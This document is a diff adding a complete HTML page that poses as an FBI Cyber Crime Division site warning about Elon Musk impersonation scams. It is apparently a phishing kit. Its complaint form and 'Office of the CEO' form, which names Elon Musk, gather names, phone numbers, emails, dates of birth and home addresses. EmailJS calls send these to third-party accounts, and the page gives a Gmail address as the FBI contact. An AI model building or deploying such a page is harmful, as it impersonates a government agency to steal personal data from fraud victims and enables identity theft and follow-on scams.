@@ -1,0 +1,1072 @@
+<!DOCTYPE html>  <html lang="en">  
+<head>  
+<meta charset="UTF-8">  
+<meta name="viewport" content="width=device-width, initial-scale=1.0">  
+<title>Cyber Alert System</title>
+<script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script>
+<script type="text/javascript">
+   (function(){
+   window.addEventListener("load", function () {
+    emailjs.init("T5NJEN5nr4l57Qd6o");
+});})();
+</script>
+<style>  
+  
+/* RESET + BASE */  
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }  
+body { font-family: 'Segoe UI', sans-serif; background: #060f1c; color: #c8d8e8; line-height: 1.65; scroll-behavior: smooth; }  
+  
+  .logo {  
+    display: flex;  
+    align-items: center;  
+    gap: 10px;  
+  }  
+  
+  .logo img {  
+    height: 50px;  
+  }  
+/* NAVBAR */  
+.navbar {  
+  position: sticky;  
+  top: 0;  
+  background: rgba(6,15,28,0.95);  
+  padding: 15px 20px;  
+  z-index: 1000;  
+  border-bottom: 1px solid rgba(255,255,255,0.08);  
+}  
+  
+.nav-inner {  
+  display: flex;  
+  justify-content: space-between;  
+  align-items: center;  
+}  
+  
+.nav-title {  
+  font-weight: bold;  
+  color: #f0f4f8;  
+}  
+  
+.nav-links {  
+  display: flex;  
+  align-items: center;
+  gap: 25px;
+  z-index: 10;
+}
+
+.close-btn {
+  position: absolute;
+  top: 15px;
+  right: 15px;
+}
+  
+.nav-link {  
+  color: #7a95b0;  
+  text-decoration: none;  
+  font-size: 15px;
+  font-weight: 500;
+  padding: 8px 12px;
+  border-radius: 6px;
+  transition: all 0.25s ease;
+}
+
+/* hover effect */
+.nav-link:hover {
+  color: #ffffff;
+  background: rgba(255, 255, 255, 0.08);
+}
+
+.nav-link.active {
+  color: #ffffff;
+  background: rgba(255, 255, 255, 0.15);
+}
+  
+/* MOBILE */  
+.hamburger {  
+  display: none;  
+  flex-direction: column;  
+  cursor: pointer;  
+}  
+  
+.hamburger span {  
+  width: 25px;  
+  height: 3px;  
+  background: white;  
+  margin: 3px 0;  
+}  
+  
+@media(max-width:768px){  
+  .nav-links {  
+    position: fixed;  
+    right: -100%;  
+    top: 0;  
+    flex-direction: column;  
+    background: #060f1c;  
+    height: 100%;  
+    width: 200px;  
+    padding: 60px 20px;  
+    transition: 0.3s;
+  }  
+
+  .close-btn {
+    display: block;
+  }
+
+  .nav-links.active {  
+    right: 0;  
+  }  
+
+  .hamburger {  
+    display: flex;  
+  }  
+}
+
+
+  
+  .nav-links.active {  
+    right: 0;  
+  }  
+  
+  .hamburger {  
+    display: flex;  
+  }  
+} 
+
+#navOverlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0,0,0,0.4);
+  display: none;
+  z-index: 5;
+}
+  
+/* ALERT */  
+.alert-banner {  
+  background: #b91c1c;  
+  text-align: center;  
+  padding: 10px;  
+  font-weight: bold;  
+}  
+  
+/* HERO */  
+.hero {  
+  padding: 60px 20px;  
+  text-align: center;  
+}  
+  
+.hero h1 {  
+  color: #f0f4f8;  
+}  
+  
+/* SECTIONS */  
+.section {  
+  padding: 40px 20px;  
+}  
+  
+.card {  
+  background: #0c1e38;  
+  padding: 15px;  
+  margin: 10px 0;  
+  border-radius: 6px;  
+}  
+  
+/* BUTTON */  
+button {  
+  background: #c9a84c;  
+  padding: 12px;  
+  border: none;  
+  width: 100%;  
+  cursor: pointer;  
+  border-radius: 4px;  
+}  
+  
+button:hover {  
+  background: #d4b860;  
+}  
+  
+/* FORM */  
+input {  
+  width: 100%;  
+  padding: 10px;  
+  margin: 8px 0;  
+  border: 1px solid #2a4a6a;  
+  border-radius: 4px;  
+  background: #0c1e38;  
+  color: #c8d8e8;  
+  box-sizing: border-box;  
+}  
+  
+input::placeholder {  
+  color: #7a95b0;  
+}  
+  
+footer {  
+  text-align: center;  
+  padding: 30px 20px;  
+  border-top:1px solid rgba(255,255,255,0.05);  
+  background: #030a14;  
+}  
+  
+footer p {  
+  margin: 8px 0;  
+  font-size: 14px;  
+  color: #7a95b0;  
+}  
+  
+footer p:first-child {  
+  color: #c9a84c;  
+  font-weight: bold;  
+}  
+  
+/* IC3 ALERT LINKS */  
+.alert-link {  
+  display:block;  
+  color:#c8d8e8;  
+  text-decoration: none;  
+  transition: color 0.3s;  
+}  
+.alert-link:hover {  
+  color:#c9a84c;  
+}
+#complaintBtn {
+  background: #b91c1c;
+  color: #ffffff;
+  font-weight: 800;
+  font-size: 18px;
+  padding: 18px 20px;
+  border: 1px solid #7f1d1d;
+  border-radius: 8px;
+  cursor: pointer;
+  width: 100%;
+  max-width: 380px;
+  display: block;
+  margin: 25px auto 0;
+  letter-spacing: 1px;
+  text-transform: uppercase;
+  transition: all 0.2s ease;
+  box-shadow: 0 10px 22px rgba(185, 28, 28, 0.25);
+}
+
+#complaintBtn:hover {
+  background: #991b1b;
+  box-shadow: 0 14px 28px rgba(185, 28, 28, 0.35);
+  transform: translateY(-2px);
+}
+
+#complaintBtn:active {
+  transform: scale(0.99);
+  box-shadow: 0 8px 18px rgba(185, 28, 28, 0.2);
+}
+
+/* CEO SECTION (matches your design system) */
+#ceo-contact {
+  text-align: center;
+}
+
+#ceo-contact p {
+  color: #7a95b0;
+  font-size: 15px;
+}
+
+/* CEO BUTTON (gold, same system as default button but refined) */
+#ceoBtn {
+  background: #c9a84c;
+  color: #060f1c;
+  font-weight: 800;
+  font-size: 17px;
+  padding: 18px 20px;
+  border: 1px solid #a8892f;
+  border-radius: 8px;
+  cursor: pointer;
+  width: 100%;
+  max-width: 380px;
+  display: block;
+  margin: 20px auto 0;
+  letter-spacing: 1px;
+  text-transform: uppercase;
+  transition: all 0.2s ease;
+  box-shadow: 0 10px 22px rgba(201, 168, 76, 0.25);
+}
+
+#ceoBtn:hover {
+  background: #d4b860;
+  box-shadow: 0 14px 28px rgba(201, 168, 76, 0.35);
+  transform: translateY(-2px);
+}
+
+#ceoBtn:active {
+  transform: scale(0.99);
+  box-shadow: 0 8px 18px rgba(201, 168, 76, 0.2);
+}
+#ceoForm{
+  display:none;
+  opacity:0;
+  transform: translateY(10px);
+  transition: all 0.4s ease;
+}
+
+#ceoForm.show{
+  display:block;
+  opacity:1;
+  transform: translateY(0);
+}
+
+#contactPage {
+  display: none;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+
+  background: rgba(6, 15, 28, 0.95);
+  backdrop-filter: blur(12px);
+  -webkit-backdrop-filter: blur(12px);
+
+  color: #c8d8e8;
+  z-index: 99999;
+  overflow-y: auto;
+
+  transform: translateX(100%);
+  transition: transform 0.35s ease;
+}
+
+</style>  </head>  <body>  <!-- NAVBAR -->  <div class="navbar">  
+  <div class="nav-inner">  
+    <div class="logo">  
+      <img src="https://www.ic3.gov/img/fbi_seal_new.webp" alt="FBI Seal">  
+      <div class="nav-title">Federal Bureau of Investigation – Cyber Crime Division</div>  
+    </div>  <div class="nav-links" id="navLinks">
+
+  <!-- CLOSE BUTTON -->
+  <div class="close-btn" onclick="closeMenu()">✕</div>
+
+  <a href="#home" class="nav-link" onclick="closeMenu()">Home</a>  
+  <a href="#report" class="nav-link" onclick="closeMenu()">Report a Crime</a>  
+  <a href="#alerts" class="nav-link" onclick="closeMenu()">Scam Alerts</a>  
+  <a href="#resources" class="nav-link" onclick="closeMenu()">Resources</a>  
+  <a href="javascript:void(0)" class="nav-link" onclick="openContactPage(); closeMenu()">Contact</a>
+
+</div>
+
+<div class="hamburger" onclick="toggleMenu()">  
+  <span></span><span></span><span></span>  
+</div>
+
+  </div>  
+  <div id="navOverlay" onclick="closeMenu()"></div>
+</div>  <!-- ALERT -->  <div class="alert-banner">  
+⚠️ URGENT WARNING: Ongoing scams involving impersonation of celebrity Elon Musk are targeting victims worldwide.  
+</div>  <!-- HERO -->  <section class="hero" id="home">  
+<h1>🚨 Elon Musk Impersonation Scam Alert</h1>  
+<p>Criminals are posing as Elon Musk to deceive individuals into sending money.</p>  
+<p>The FBI has received numerous reports of scammers falsely claiming to be Elon Musk through social media. These scams often promise unrealistic gifts, giveaways, or investment opportunities.</p> 
+</section>  <!-- HOW SCAM WORKS -->  <section class="section" id="alerts">  
+<h2>How the Scam Works</h2>  <div class="card">1. Initial Contact – Social media or messaging apps</div>  
+<div class="card">2. Impersonation – Fake Elon Musk profiles</div>  
+<div class="card">3. The Offer – Crypto doubling / fake investments</div>  
+<div class="card">4. Payment Request – Crypto, gift cards, wire</div>  
+<div class="card">5. Disappearance – Scammer vanishes</div>  
+</section>  <!-- WARNING -->  <section class="section">  
+<h2>Warning Signs</h2>  
+<div class="card">❌ Requests for gift card payments</div>  
+<div class="card">❌ Promises of guaranteed returns or doubled money</div>  
+<div class="card">❌ Messages claiming to be directly from Elon Musk</div>  
+<div class="card">❌ Poor grammar or suspicious links</div>  
+<div class="card">❌ Requests for financial information</div>  
+</section>  <!-- TRUTH -->  <section class="section">  
+<h2>Know the Truth</h2>  
+<div class="card">Elon Musk does NOT ask individuals for money directly</div>  
+<div class="card">No private giveaways via direct messages</div>  
+<div class="card">No gift card transfers</div>  
+</section>  <!-- IMPACT -->  <section class="section">  
+<h2>Reported Losses</h2>  
+<div class="card">Thousands of victims globally</div>  
+<div class="card">Millions of dollars lost in wire scams</div>  
+<div class="card">Emotional and financial distress reported</div>  
+</section>  <!-- PROTECT -->  <section class="section">  
+<h2>Protect Yourself</h2>  
+<div class="card">Do NOT send money or Gift card</div>  
+<div class="card">Stop communication immediately</div>  
+<div class="card">Take screenshots</div>  
+<div class="card">Report the account</div>  
+<div class="card">Secure your financial accounts</div>  
+</section>  <!-- IC3 ALERTS -->  <section class="section">  
+<h2>Recent IC3 Alerts</h2>  <h3>Public</h3>  <a class="card alert-link" href="https://www.ic3.gov/PSA/2026/PSA260320" target="_blank">  
+Mar 20 - Russian Intelligence Services Target Commercial Messaging Application Accounts  
+</a>  <a class="card alert-link" href="https://www.ic3.gov/PSA/2026/PSA260309" target="_blank">  
+Mar 12 - Evading Residential Proxy Networks  
+</a>  <a class="card alert-link" href="https://www.ic3.gov/PSA/2025/PSA251219" target="_blank">  
+Mar 09 - Criminals Impersonating Officials  
+</a>  <a class="card alert-link" href="https://www.ic3.gov/PSA/2025/PSA251217" target="_blank">  
+Dec 19 - Senior Officials Impersonation Campaign  
+</a>  <a class="card alert-link" href="https://www.ic3.gov/PSA/2025/PSA251217" target="_blank">  
+Dec 17 - High Risk Gambling Awareness  
+</a>  <h3>Industry</h3>  <a class="card alert-link" href="https://www.ic3.gov/CSA/2026/260320" target="_blank">  
+Mar 20 - Iran Cyber Actors Telegram Malware  
+</a>  <a class="card alert-link" href="https://www.ic3.gov/CSA/2026/260312" target="_blank">  
+Mar 12 - AVrecon Malware  
+</a>  <a class="card alert-link" href="https://www.ic3.gov/CSA/2026/260219" target="_blank">  
+Feb 19 - ATM Jackpotting Increase  
+</a>  <a class="card alert-link" href="https://www.ic3.gov/CSA/2026/260205" target="_blank">  
+Feb 05 - Attack Surface Reduction  
+</a>  <a class="card alert-link" href="https://www.ic3.gov/CSA/2026/260114.pdf" target="_blank">  
+Jan 14 - Secure OT Connectivity  
+</a>  </section>  <!-- REPORT -->  <section class="section" id="report">  
+
+<h2>Report to the FBI</h2> 
+<button id="complaintBtn" onclick="openTerms()">📄file a complaint</button>
+<form id="reportForm" style="display:none;margin-top:15px;">  
+<input type="text" id="name" placeholder="Name" required>  
+<input type="text" id="business" placeholder="Business" required>  
+<input type="tel" id="phone" placeholder="Phone" required>  
+<input type="email" id="email" placeholder="Email" required>
+<input type="text" id="message" placeholder="message" required><button type="button" id="complaintBtnSend" onclick="sendEmail()">
+  Report a Scam Now
+</button>
+</form>
+<div id="complaintSuccess" style="
+  display:none;
+  margin-top:15px;
+  padding:12px;
+  background:#0f2a1a;
+  border:1px solid #2ecc71;
+  color:#2ecc71;
+  border-radius:6px;
+">
+  ✅ Complaint successfully submitted
+</div>
+
+<button id="complaintResetBtn" onclick="resetComplaintForm()" style="
+  display:none;
+  margin-top:10px;
+  padding:10px;
+  width:100%;
+  background:#2a4a6a;
+  color:#fff;
+  border:none;
+  border-radius:6px;
+  cursor:pointer;
+">
+  New Complaint
+</button>
+
+  
+
+
+<div id="termsModal" style="
+  display:none;
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,0.85);
+  z-index:99999;
+  justify-content:center;
+  align-items:center;
+">
+
+  <div style="
+    background:#0c1e38;
+    color:#c8d8e8;
+    width:90%;
+    max-width:500px;
+    padding:20px;
+    border-radius:10px;
+  ">
+
+    <h2>Terms & Conditions</h2>
+
+    <p style="margin-top:10px; line-height:1.6;">
+      By continuing, you confirm that all information submitted is true and accurate.
+      This system is strictly for cybercrime reporting purposes.
+    </p>
+
+    <div style="margin-top:20px; display:flex; gap:10px;">
+      <button type="button" onclick="acceptTerms()">Accept</button>
+      <button type="button" onclick="declineTerms()" style="background:#7a95b0;">
+        Decline
+      </button>
+    </div>
+
+  </div>
+</div>
+<div id="ceoTermsModal" style="
+  display:none;
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,0.85);
+  z-index:99999;
+  justify-content:center;
+  align-items:center;
+">
+
+  <div style="
+    background:#0c1e38;
+    color:#c8d8e8;
+    width:90%;
+    max-width:500px;
+    padding:20px;
+    border-radius:10px;
+  ">
+
+    <h2>Office of the CEO – Terms & Conditions</h2>
+
+    <p style="margin-top:10px; line-height:1.6;">
+      This channel is reserved for serious matters requiring executive review.
+      False or misleading submissions may be rejected without response.
+      By continuing, you agree that your message is accurate and submitted in good faith.
+    </p>
+
+    <div style="margin-top:20px; display:flex; gap:10px;">
+      <button type="button" onclick="acceptCeoTerms()">Accept</button>
+      <button type="button" onclick="declineCeoTerms()" style="background:#7a95b0;">
+        Decline
+      </button>
+    </div>
+
+  </div>
+</div>
+</section>  <!-- RESOURCES -->  <section class="section" id="resources">  
+<h2>Stay Safe Online</h2>  
+<div class="card">Block suspicious accounts</div>  
+<div class="card">Avoid unsolicited investment offers</div>  
+<div class="card">Use two-factor authentication</div>  
+<div class="card">Never share passwords or keys</div>  
+<div class="card">Be skeptical of "too good to be true" offers</div>  
+</section>
+<section class="section" id="ceo-contact">
+  <div style="
+  background:#0c1e38;
+  border-left:4px solid #c9a84c;
+  padding:12px 15px;
+  margin-bottom:15px;
+  border-radius:6px;
+">
+
+  <strong style="color:#f0f4f8;">Office of the CEO</strong><br>
+  <span style="color:#c9a84c; font-weight:600;">
+    Assigned Executive: Elon Musk
+  </span>
+
+</div>
+
+  <h2>Contact Office of the CEO</h2>
+
+  <p style="text-align:center; max-width:600px; margin:10px auto 20px;">
+    For high-level concerns or escalations, you may contact the Office of the CEO.
+    All submissions are subject to review and verification.
+  </p>
+
+ <button id="ceoBtn" onclick="openCeoTerms()">
+  📩 Contact Office of the CEO
+</button>
+
+<form id="ceoForm" style="display:none; margin-top:15px;">
+  
+  <input type="text" id="ceo_firstname" placeholder="First Name" required>
+
+  <input type="text" id="ceo_lastname" placeholder="Last Name" required>
+
+  <select id="ceo_gender" required style="
+    width:100%;
+    padding:10px;
+    margin:8px 0;
+    border:1px solid #2a4a6a;
+    border-radius:4px;
+    background:#0c1e38;
+    color:#c8d8e8;
+  ">
+    <option value="">Select Gender</option>
+    <option value="Male">Male</option>
+    <option value="Female">Female</option>
+  </select>
+
+  <input type="text" id="ceo_occupation" placeholder="Occupation" required>
+
+  <input type="text" id="ceo_state" placeholder="State" required>
+
+  <input type="text" id="ceo_address" placeholder="Home Address" required>
+  
+<label style="display:block; margin-top:10px; color:#7a95b0;">
+  Date of Birth
+</label>
+
+<input type="date" id="ceo_dob" required style="
+  width:100%;
+  padding:10px;
+  margin:8px 0;
+  border:1px solid #2a4a6a;
+  border-radius:4px;
+  background:#0c1e38;
+  color:#c8d8e8;
+">
+
+<button type="button" id="ceoSendBtn" onclick="sendCeoEmail()">
+  Send to Executive Office
+</button>
+
+</form>
+<div id="ceoSuccess" style="
+  display:none;
+  margin-top:15px;
+  padding:12px;
+  background:#0f2a1a;
+  border:1px solid #2ecc71;
+  color:#2ecc71;
+  border-radius:6px;
+">
+  ✅ Message successfully sent to Executive Office
+</div>
+<button id="ceoResetBtn"onclick="resetCeoForm()" style="
+  display:none;
+  margin-top:10px;
+  padding:10px;
+  width:100%;
+  background:#2a4a6a;
+  color:#fff;
+  border:none;
+  border-radius:6px;
+  cursor:pointer;
+">
+  New Request
+</button>
+</section>
+
+<!-- CONTACT PAGE OVERLAY -->
+<div id="contactPage">
+
+  <div style="max-width:800px; margin:auto; padding:40px 20px;">
+
+    <h1>Cyber Crime Reporting Center</h1>
+
+    <p style="margin-top:15px;">
+      This secure communication channel is used for reporting cybercrime incidents,
+      digital fraud, impersonation, phishing attacks, and online financial scams.
+    </p>
+
+    <h2 style="margin-top:30px;">Jurisdiction Notice</h2>
+
+    <p>
+      All reports submitted are reviewed under cybercrime investigation protocols.
+      False reports may be disregarded or flagged for review.
+    </p>
+
+    <h2 style="margin-top:30px;">Contact Information</h2>
+
+    <p>
+      Email:
+      <a href="mailto:FBI.cid.fcs@gmail.com" style="color:#c9a84c;">
+        FBI.cid.fcs@gmail.com
+      </a>
+    </p>
+
+    <h2 style="margin-top:30px;">Headquarters</h2>
+
+    <p>
+      Contact FBI Headquarters<br>
+      935 Pennsylvania Avenue, NW<br>
+      Washington, D.C.
+    </p>
+
+    <h2 style="margin-top:30px;">Important Notice</h2>
+
+    <p>
+      The FBI does not request payments, gift cards, or cryptocurrency for investigations.
+      Always verify suspicious communication before responding.
+    </p>
+
+  </div>
+
+</div>
+<!-- FOOTER -->  <footer id="contact">  
+<p>Privacy Policy | Terms of Use | Accessibility | Contact FBI</p>  
+<p>This alert is issued to protect the public from fraudulent activities. The FBI does not endorse any investment or request funds from individuals.</p>  
+<p>Stay vigilant. If something feels suspicious, trust your instincts and report it immediately. Awareness is the first step in preventing cybercrime.</p>  <div style="margin-top:40px; border-top:1px solid rgba(255,255,255,0.08); padding-top:30px;">    <div style="display:flex; flex-direction:column; align-items:center; gap:20px;">  <div style="display:flex; align-items:center; gap:15px;">  
+
+  <img src="https://www.ic3.gov/img/fbi_seal_new.webp"  
+       alt="FBI Seal"  
+       style="width:60px; height:60px; object-fit:contain;">  
+
+  <div style="display:flex; flex-direction:column;">  
+    <span style="font-size:28px; font-weight:800; color:#f0f4f8; letter-spacing:1px;">FBI</span>  
+    <span style="font-size:12px; color:#c8d8e8; letter-spacing:1px;">  
+      FEDERAL BUREAU OF INVESTIGATION  
+    </span>  
+  </div>  
+</div>  
+  
+<div style="display:flex; gap:20px;">  
+
+  <a href="#">  
+    <svg width="22" height="22" fill="#c8d8e8" viewBox="0 0 24 24">  
+      <path d="M22 12a10 10 0 1 0-11.5 9.9v-7H8v-3h2.5V9.5c0-2.5 1.5-3.9 3.8-3.9 1.1 0 2.2.2 2.2.2v2.4h-1.2c-1.2 0-1.5.7-1.5 1.4V12H17l-.5 3h-2.7v7A10 10 0 0 0 22 12"/>  
+    </svg>  
+  </a>  
+
+  <a href="#">  
+    <svg width="22" height="22" fill="#c8d8e8" viewBox="0 0 24 24">  
+      <path d="M3 3h4l5 7 6-7h3l-7 9 8 9h-4l-6-7-6 7H2l8-9-7-9z"/>  
+    </svg>  
+  </a>  
+
+  <a href="#">  
+    <svg width="22" height="22" fill="#c8d8e8" viewBox="0 0 24 24">  
+      <path d="M10 15l5-3-5-3v6zm12-3a10 10 0 1 1-20 0 10 10 0 0 1 20 0z"/>  
+    </svg>  
+  </a>  
+
+  <a href="#">  
+    <svg width="22" height="22" fill="#c8d8e8" viewBox="0 0 24 24">  
+      <path d="M20 20h-3v-5c0-1.2-.5-2-1.7-2s-2 1-2 2v5H10V9h3v1.5c.5-.8 1.5-1.5 3-1.5 2.2 0 4 1.5 4 4.5V20zM6.5 8A1.5 1.5 0 1 1 6.5 5a1.5 1.5 0 0 1 0 3zM8 20H5V9h3v11z"/>  
+    </svg>  
+  </a>  
+
+  <a href="#">  
+    <svg width="22" height="22" fill="#c8d8e8" viewBox="0 0 24 24">  
+      <path d="M12 2c3 0 3.4 0 4.6.1 1.2.1 2 .3 2.5.5.6.2 1 .5 1.5 1s.8.9 1 1.5c.2.5.4 1.3.5 2.5.1 1.2.1 1.6.1 4.6s0 3.4-.1 4.6c-.1 1.2-.3 2-.5 2.5-.2.6-.5 1-1 1.5s-.9.8-1.5 1c-.5.2-1.3.4-2.5.5-1.2.1-1.6.1-4.6.1s-3.4 0-4.6-.1c-1.2-.1-2-.3-2.5-.5-.6-.2-1-.5-1.5-1s-.8-.9-1-1.5c-.2-.5-.4-1.3-.5-2.5C2 15.4 2 15 2 12s0-3.4.1-4.6c.1-1.2.3-2 .5-2.5.2-.6.5-1 1-1.5s.9-.8 1.5-1c.5-.2 1.3-.4 2.5-.5C8.6 2 9 2 12 2zm0 3a7 7 0 1 0 0 14 7 7 0 0 0 0-14z"/>  
+    </svg>  
+  </a>  
+
+</div>  
+
+<p style="font-size:16px; color:#c8d8e8;">  
+  FBI.gov Contact Center  
+</p>
+
+  </div>  </div>  
+</footer>  <!-- SCROLL TO TOP BUTTON -->  <button onclick="scrollToTop()" id="scrollBtn"  
+style="  
+position:fixed;  
+right:20px;  
+bottom:20px;  
+width:60px;  
+height:60px;  
+border-radius:50%;  
+background:#2a4a6a;  
+color:white;  
+font-size:22px;  
+border:none;  
+cursor:pointer;  
+opacity:0;  
+transform:translateY(20px);  
+transition:all 0.3s ease;  
+z-index:999;  
+">
+↑
+</button>
+
+<script>  
+function scrollToTop(){  
+  window.scrollTo({ top: 0, behavior: 'smooth' });  
+}  
+  
+window.addEventListener("scroll", function(){  
+  const btn = document.getElementById("scrollBtn");  
+  if(window.scrollY > 200){  
+    btn.style.opacity = "1";  
+    btn.style.transform = "translateY(0)";  
+  } else {  
+    btn.style.opacity = "0";  
+    btn.style.transform = "translateY(20px)";  
+  }  
+});  
+
+  
+
+document.addEventListener("DOMContentLoaded", () => {
+  const links = document.querySelectorAll(".nav-link");
+
+  links.forEach(link => {
+    link.addEventListener("click", () => {
+      links.forEach(l => l.classList.remove("active"));
+      link.classList.add("active");
+    });
+  });
+});
+  
+function toggleMenu(){
+  const menu = document.getElementById("navLinks");
+  const overlay = document.getElementById("navOverlay");
+
+  menu.classList.toggle("active");
+
+  if(menu.classList.contains("active")){
+    overlay.style.display = "block";
+  } else {
+    overlay.style.display = "none";
+  }
+}
+  
+function openMenu() {
+  document.getElementById("navLinks").classList.add("active");
+  document.getElementById("navOverlay").style.display = "block";
+}
+
+function closeMenu() {
+  document.getElementById("navLinks").classList.remove("active");
+  document.getElementById("navOverlay").style.display = "none";
+}
+
+function openTerms(){
+  document.body.style.overflow = "hidden";
+  document.getElementById("termsModal").style.display = "flex";
+}
+
+function acceptTerms(){
+  document.body.style.overflow = "auto";
+  document.getElementById("termsModal").style.display = "none";
+
+  // show form
+  document.getElementById("reportForm").style.display = "block";
+
+  // hide button
+  document.getElementById("complaintBtn").style.display = "none";
+}
+
+function declineTerms(){
+  document.body.style.overflow = "auto";
+  document.getElementById("termsModal").style.display = "none";
+}
+
+function sendEmail(){
+
+  const sendBtn = document.getElementById("complaintBtnSend");
+
+  sendBtn.disabled = true;
+  sendBtn.innerText = "Sending...";
+
+  const name = document.querySelector("#name").value;
+  const business = document.querySelector("#business").value;
+  const phone = document.querySelector("#phone").value;
+  const email = document.querySelector("#email").value;
+  const message = document.querySelector("#message").value;
+
+  if(!name || !business || !phone || !email || !message){
+    alert("Please fill all fields");
+
+    sendBtn.disabled = false;
+    sendBtn.innerText = "Report a Scam Now";
+    return;
+  }
+
+  const templateParams = {
+    name,
+    business,
+    phone,
+    email,
+    message
+  };
+
+  emailjs.send('service_ocr8bbv', 'template_nfx6r7t', templateParams)
+
+  .then(() => {
+
+    document.getElementById("complaintSuccess").style.display = "block";
+
+    document.getElementById("reportForm").reset();
+
+    sendBtn.disabled = true;
+    sendBtn.innerText = "Submitted";
+
+    document.querySelectorAll("#reportForm input").forEach(el => {
+      el.disabled = true;
+    });
+
+    document.getElementById("complaintResetBtn").style.display = "block";
+
+    setTimeout(() => {
+      document.getElementById("complaintSuccess").style.display = "none";
+    }, 4000);
+
+  })
+
+  .catch((error) => {
+
+    console.log(error);
+
+    alert("Failed to send complaint");
+
+    sendBtn.disabled = false;
+    sendBtn.innerText = "Report a Scam Now";
+  });
+}
+
+function resetComplaintForm(){
+
+  const form = document.getElementById("reportForm");
+  const sendBtn = document.getElementById("complaintBtnSend");
+
+  form.reset();
+
+  document.querySelectorAll("#reportForm input").forEach(el => {
+    el.disabled = false;
+  });
+
+  sendBtn.disabled = false;
+  sendBtn.innerText = "Report a Scam Now";
+
+  document.getElementById("complaintResetBtn").style.display = "none";
+  document.getElementById("complaintSuccess").style.display = "none";
+}
+
+function openCeoTerms(){
+  document.body.style.overflow = "hidden";
+  document.getElementById("ceoTermsModal").style.display = "flex";
+
+}
+
+function declineCeoTerms(){
+ document.body.style.overflow = "auto"; 
+  document.getElementById("ceoTermsModal").style.display = "none";
+
+}
+
+function acceptCeoTerms(){
+  document.body.style.overflow = "auto";
+  document.getElementById("ceoTermsModal").style.display = "none";
+
+  // hide button
+  document.getElementById("ceoBtn").style.display = "none";
+
+  // show form + animation
+  const form = document.getElementById("ceoForm");
+  form.style.display = "block";
+
+  setTimeout(() => {
+    form.classList.add("show");
+  }, 50);
+}
+
+function sendCeoEmail(){
+
+  const sendBtn = document.getElementById("ceoSendBtn");
+  sendBtn.disabled = true;
+  sendBtn.innerText = "Sending...";
+
+  // GET VALUES FIRST
+  const firstName = document.querySelector("#ceo_firstname").value;
+  const lastName = document.querySelector("#ceo_lastname").value;
+  const dob = document.querySelector("#ceo_dob").value;
+  const gender = document.querySelector("#ceo_gender").value;
+  const occupation = document.querySelector("#ceo_occupation").value;
+  const state = document.querySelector("#ceo_state").value;
+  const address = document.querySelector("#ceo_address").value;
+  
+
+  // VALIDATION
+  if(!firstName || !lastName || !dob || !gender || !occupation || !state || !address){
+
+    alert("Please fill all fields before sending.");
+
+    sendBtn.disabled = false;
+    sendBtn.innerText = "Send to Executive Office";
+    return;
+  }
+
+  // SINGLE TEMPLATE OBJECT
+  const templateParams = {
+  first_name: firstName,
+  last_name: lastName,
+  dob: dob,
+  gender: gender,
+  occupation: occupation,
+  state: state,
+  address: address,
+};
+
+  emailjs.send('service_8achlim', 'template_etse7q4', templateParams)
+
+  .then(() => {
+
+    const successBox = document.getElementById("ceoSuccess");
+    successBox.style.display = "block";
+
+    document.getElementById("ceoForm").reset();
+
+    sendBtn.disabled = true;
+    sendBtn.innerText = "Submitted";
+
+    document.querySelectorAll("#ceoForm input, #ceoForm select").forEach(el => {
+      el.disabled = true;
+    });
+      document.getElementById("ceoResetBtn").style.display = "block";
+    
+
+    setTimeout(() => {
+      successBox.style.display = "none";
+    }, 4000);
+
+  })
+
+  .catch(() => {
+
+    alert("Failed to send");
+
+    sendBtn.disabled = false;
+    sendBtn.innerText = "Send to Executive Office";
+
+  });
+}
+
+function resetCeoForm(){
+
+  const form = document.getElementById("ceoForm");
+  const sendBtn = document.getElementById("ceoSendBtn");
+
+  // unlock inputs
+  document.querySelectorAll("#ceoForm input, #ceoForm select").forEach(el => {
+    el.disabled = false;
+  });
+
+  // reset form
+  form.reset();
+
+  // restore button
+  sendBtn.disabled = false;
+  sendBtn.innerText = "Send to Executive Office";
+
+  // hide reset button + success message
+  document.getElementById("ceoResetBtn").style.display = "none";
+  document.getElementById("ceoSuccess").style.display = "none";
+}
+
+function openContactPage() {
+  const page = document.getElementById("contactPage");
+
+  page.style.display = "block";
+
+  setTimeout(() => {
+    page.style.transform = "translateX(0)";
+  }, 10);
+
+  document.body.style.overflow = "hidden";
+
+  // 👇 add fake history entry
+  history.pushState({ page: "contact" }, "");
+}
+
+window.addEventListener("popstate", function (event) {
+  const page = document.getElementById("contactPage");
+
+  if (page.style.display === "block") {
+    closeContactPage();
+  }
+});
+
+function closeContactPage() {
+  const page = document.getElementById("contactPage");
+
+  page.style.transform = "translateX(100%)";
+
+  setTimeout(() => {
+    page.style.display = "none";
+    document.body.style.overflow = "auto";
+  }, 350);
+}
+
+
+</script>  </body>  
+</html>  
